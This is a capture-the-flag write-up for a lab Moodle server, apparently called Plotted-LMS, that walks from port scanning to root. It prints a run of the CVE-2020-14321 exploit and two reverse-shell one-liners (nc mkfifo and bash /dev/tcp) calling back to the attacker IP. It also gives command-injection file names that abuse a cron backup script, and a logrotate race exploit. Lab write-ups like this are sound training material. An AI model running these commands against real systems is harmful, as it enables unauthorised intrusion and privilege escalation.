{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Enumeration", "enumeration")}}

{{text("We start by scanning the ports.")}}

{{console("nmap -T5 -p- -sV -sC 10.10.127.117", "Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-15 02:56 CET
Nmap scan report for 10.10.127.117
Host is up (0.074s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 67:af:92:c1:f0:9f:8a:18:62:8d:bf:ba:c4:58:8d:52 (RSA)
|   256 03:ca:42:df:ef:4b:3e:e6:91:0e:b2:bc:b4:42:1e:d1 (ECDSA)
|_  256 f1:ed:8a:8d:e4:87:d8:c7:69:c1:ca:2b:a4:dc:0c:dc (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
873/tcp  open  http    Apache httpd 2.4.52 ((Debian))
|_http-server-header: Apache/2.4.52 (Debian)
|_http-title: Apache2 Debian Default Page: It works
8820/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
9020/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 262.95 seconds")}}

{{text("We find 5 ports open.")}}

{{list(['22 (SSH)', '80 (HTTP)', '873 (HTTP)', '8820 (HTTP)', '9020 (HTTP)'])}}

{{header("Web page", "web-page")}}

{{text("A lot of HTTP servers. I started directory enumerating from the last one because I thought it was more probable I would find something and I was right.")}}

{{console("gobuster dir -u http://10.10.127.117:9020/ -w /usr/share/wordlists/dirb/big.txt", "===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.127.117:9020/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 104]
/.htaccess            (Status: 403) [Size: 104]
/admin                (Status: 200) [Size: 105]
/credentials          (Status: 200) [Size: 105]
/moodle               (Status: 301) [Size: 322] [--> http://10.10.127.117:9020/moodle/]
/server-status        (Status: 403) [Size: 104]
Progress: 20469 / 20470 (100.00%)
===============================================================                                                       
Finished                                                                                                              
===============================================================")}}

{{text("The <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>admin</code> and <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>credentials</code> directories were fake, but <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>moodle</code> wasn't.")}}

{{image("../../static/writeups/plottedlms/images/000001.jpg")}}

{{text("We register as a new user and when we go to courses, we are able to enroll as a teacher instantly.")}}

{{image("../../static/writeups/plottedlms/images/000002.jpg")}}

{{header("Shell as www-data", "shell-as-www-data")}}

{{text("Now we are able to use a tool called <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>moodlescan</code> to gather more informations.")}}

{{link("https://github.com/inc0d3/moodlescan", "", "moodlescan v0.8")}}

{{text("We install it by following the instructions and run it against our web page.")}}

{{console("python3 moodlescan.py -u http://10.10.127.117:9020/moodle", "
...                                                                                           
Version 0.8 - May/2021
.............................................................................................................

By Victor Herrera - supported by www.incode.cl

.............................................................................................................

Getting server information http://10.10.127.117:9020/moodle ...

server          : Apache/2.4.41 (Ubuntu)
x-frame-options : sameorigin
last-modified   : Sun, 15 Dec 2024 02:18:08 GMT

Getting moodle version...

Version found via /admin/tool/lp/tests/behat/course_competencies.feature : Moodle v3.9.0-beta

Searching vulnerabilities...

Vulnerabilities found: 0

Scan completed.")}}

{{text("It didn't find any vulnerabilities, but we do have the version that is being used. Let's search for any known exploits to that version.")}}

{{link("https://github.com/HoangKien1020/CVE-2020-14321", "", "CVE-2020-14321")}}

{{text("We copy it onto our machine and run it.")}}

{{text("If for some reason it doesn't work for you, change the 9th line to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>headers={'Content-Type':'application/x-www-form-urlencoded','Referer': 'http://MACHINE_IP:9020/moodle/'}</code>.")}}

{{console("python3 exploit.py -url http://10.10.127.117:9020/moodle -cookie b7375pbubd51c42i2tes9dtfg9 -cmd whoami", "                           ***CVE 2020 14321*** 
    How to use this PoC script
    Case 1. If you have vaid credentials:
    python3 cve202014321.py -u http://test.local:8080 -u teacher -p 1234 -cmd=dir
    Case 2. If you have valid cookie:
    python3 cve202014321.py -u http://test.local:8080 -cookie=37ov37abn9kv22gj7enred9bl7 -cmd=dir
    
[+] Your target: http://10.10.127.117:9020/moodle
[+] Logging in to teacher
[+] Teacher logins successfully!
[+] Privilege Escalation To Manager in the course Done!
[+] Maybe RCE via install plugins!
[+] Checking RCE ...
[+] RCE link in here:
http://10.10.127.117:9020/moodle/blocks/rce/lang/en/block_rce.php?cmd=whoami

www-data")}}

{{text("We now have remote code execution on the target machine.")}}

{{text("Now it is possible for us to use the generated link and send commands from there.")}}

{{text("Let us proceed to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>revshells.com</code> and get ourselves a URL encoded <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>nc mkfifo</code> shell and pass it as the parameter.")}}

{{image("../../static/writeups/plottedlms/images/000003.jpg")}}

{{header("Shell as plot_admin", "shell-as-plot-admin")}}

{{text("Now that we have a reverse shell, let us search for ways to privilage escalate.")}}

{{text("In the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/home/plot_admin/</code> directory we find an interesting looking script named <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>backup.py</code>.")}}

{{console("cat backup.py", "import os

moodle_location = '/var/www/uploadedfiles/filedir/'
backup_location = '/home/plot_admin/.moodle_backup/'

os.system('/usr/bin/rm -rf ' + backup_location + '*')

for (root,dirs,files) in os.walk(moodle_location):
        for file in files:
                os.system('/usr/bin/cp '' + root + '/' + file + '' ' + backup_location)")}}

{{text("Upon checking <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/etc/crontab</code> we discover that this script runs every minute.")}}

{{text("I found out that we have write permissions to the path that <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>moodle_location</code> is pointing at. Because the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>os.system</code> call doesn't sanitize any of the file names, it is possible to exploit it.")}}

{{text("For example if we create a file named <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>'|| whoami'</code>, it will pipe the file name as a normal command.")}}

{{text("I tested it, and it worked.")}}

{{image("../../static/writeups/plottedlms/images/000004.jpg")}}

{{text("Now we can abuse it to privilage escalate.")}}

{{text("We create a file that will grant us all the permissions to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/home/plot_admin</code> directory.")}}

{{console("echo "" > ''|chmod -R 777 .|''")}}

{{text("Since there is no <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>.ssh</code> folder, we can't just steal a private key and log in. We need to get a reverse shell as <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>plot_admin</code>.")}}

{{text("I created a file with the same reverse shell as before in <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/home/plot_admin/</code>.")}}

{{console("echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.9.1.157 1235 >/tmp/f' > shell.sh")}}

{{text("And used the same trick to get it to execute.")}}

{{console("echo '' > ''|| bash shell.sh ||''")}}

{{text("After a minute, I got a connection back.")}}

{{image("../../static/writeups/plottedlms/images/000004.jpg")}}

{{header("Shell as root", "shell-as-root")}}

{{text("After downloading <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>pspy64</code> onto the machine, I noticed that <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>logrotate</code> is being run.")}}

{{text("I confirmed that by checking it's version.")}}

{{console("logrotate --version", "logrotate 3.15.0

    Default mail command:       /bin/mail
    Default compress command:   /bin/gzip
    Default uncompress command: /bin/gunzip
    Default compress extension: .gz
    Default state file path:    /var/lib/logrotate.status
    ACL support:                no
    SELinux support:            no")}}

{{text("A quick search uncovers a article that teaches us how to exploit this version.")}}

{{link("https://medium.com/r3d-buck3t/linux-privesc-with-logrotate-utility-219b3aa7476b", "https://miro.medium.com/v2/5d8de952517e8160e40ef9841c781cdc14a5db313057fa3c3de41c6f5b494b19", "Linux PrivEsc with Logrotate Utility")}}

{{text("I followed the article by downloading the exploit mentioned, compiling it and downloading it onto the victim's machine.")}}

{{link("https://github.com/whotwagner/logrotten", "", "Winning a race condition in logrotate to elevate privileges")}}

{{text("Then I created a payload file with a reverse shell.")}}

{{console("echo 'bash -i >& /dev/tcp/10.9.1.157/1236 0>&1' > payload")}}

{{text("And finally run the exploit.")}}

{{console("./lorgotten -p payload /home/plot_admin/.logs_backup/moodle_access")}}

{{text("After a while we should get a connection and be the root user.")}}

{{script()}}